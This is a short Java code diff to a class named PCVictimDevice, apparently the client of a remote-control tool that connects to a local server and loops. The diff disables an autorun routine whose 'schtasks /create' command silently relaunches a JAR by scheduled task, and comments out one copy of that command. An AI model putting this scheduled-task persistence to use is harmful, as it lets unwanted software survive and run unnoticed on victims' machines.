@@ -104,7 +104,8 @@ public class PCVictimDevice {
             String[] params = path.split(";");
             if(isAutorun) {
                 if (params.length > 1)
-                    s = "schtasks /create /tn TestJava /sc daily /tr \"javaw -jar C:\\Users\\Vetal\\Desktop\\IntelIJProjects\\NettyProject\\out\\artifacts\\NettyProject_jar\\NettyProject.jar\" /ri 1 /f";
+                    s = "";
+                    //s = "schtasks /create /tn TestJava /sc daily /tr \"javaw -jar C:\\Users\\Vetal\\Desktop\\IntelIJProjects\\NettyProject\\out\\artifacts\\NettyProject_jar\\NettyProject.jar\" /ri 1 /f";
                 else
                     s = "schtasks /create /tn TestJava /sc daily /tr \"javaw -jar "+path+"\" /ri 1 /f";
             }
@@ -208,7 +209,7 @@ public class PCVictimDevice {
     }
 
     public static void main(String[] args) throws Exception {
-        autorun(true);
+        autorun(false);
         pcVictimDevice = new PCVictimDevice("localhost", 1121);
         while (true) {
             pcVictimDevice.run();
